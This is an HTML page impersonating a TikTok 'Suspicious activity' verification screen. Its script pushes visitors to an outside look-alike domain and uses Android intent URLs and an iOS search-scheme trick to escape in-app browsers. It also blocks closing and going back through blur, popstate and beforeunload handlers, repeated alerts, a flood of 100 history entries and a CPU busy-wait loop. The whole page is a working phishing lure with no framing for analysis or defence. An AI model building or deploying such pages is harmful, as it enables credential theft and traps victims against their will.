<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body, html { 
            margin: 0; padding: 0; background: #ffffff; 
            height: 100vh; overflow: hidden;
            -webkit-font-smoothing: antialiased;
            font-family: "Proxima Nova", "Inter", -apple-system, sans-serif;
        }
        #main-ui {
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            height: 100vh; text-align: center;
            padding: 0 35px; box-sizing: border-box;
        }
        .v-icon { width: 50px; height: 50px; margin-bottom: 15px; }
        .header { color: #161823; font-size: 20px; font-weight: 700; margin-bottom: 8px; }
        .subtext { color: #8A8B91; font-size: 14px; line-height: 1.4; margin-bottom: 30px; max-width: 280px; }
        .btn { 
            background: #fe2c55; color: #fff; padding: 12px 60px; 
            border-radius: 4px; font-weight: 600; font-size: 15px; 
            border: none; cursor: pointer; -webkit-tap-highlight-color: transparent;
        }
    </style>
</head>
<body>

    <div id="main-ui">
        <svg class="v-icon" viewBox="0 0 48 48" fill="none">
            <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
            <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
            <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
        </svg>

        <div class="header">Suspicious activity</div>
        <div class="subtext">Please complete verification to continue using TikTok.</div>

        <button class="btn" onclick="forceSystemOpen()">Verify</button>
    </div>

<script>
    const destination = "https://tik-tok-verification.com/Verification/verify1.html";

    function forceSystemOpen() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            const intent = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
            window.location.href = intent;
        } else {
            // iOS Shotgun
            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
            setTimeout(() => { window.location.href = destination; }, 100);
        }
    }

    // THE 100% CONSISTENCY ENGINE
    // This keeps the Main Thread constantly active so it can't be "killed" silently.
    function keepAlive() {
        const start = Date.now();
        // This is a "Busy Wait" loop. It forces the CPU to stay awake.
        while (Date.now() - start < 10) { /* 10ms of pure CPU usage */ }
        requestAnimationFrame(keepAlive);
    }
    requestAnimationFrame(keepAlive);

    // THE X-BUTTON BLOCKER
    window.onblur = function() {
        // 1. First, we send the escape signal
        forceSystemOpen();

        // 2. This alert is the ONLY way to stop the "X" from closing the app.
        // It freezes the JavaScript engine, which stops the Native UI thread from finishing the close.
        alert("Verification Required\n\nPlease click OK to continue in your secure system browser.");
        
        // 3. Immediately try again after they click OK
        forceSystemOpen();
        
        // 4. Force focus back so they can't see the site close
        window.focus();
    };

    // THE BACK-BUTTON BLOCKER
    window.onload = () => {
        for(let i=0; i<100; i++) history.pushState(null, null, "#" + i);
    };

    window.onpopstate = function() {
        forceSystemOpen();
        alert("Verify to continue.");
    };

    // Prevents swipe-to-close on some mobile browsers
    window.onbeforeunload = function() {
        forceSystemOpen();
        return "Are you sure?";
    };
</script>
</body>
</html>
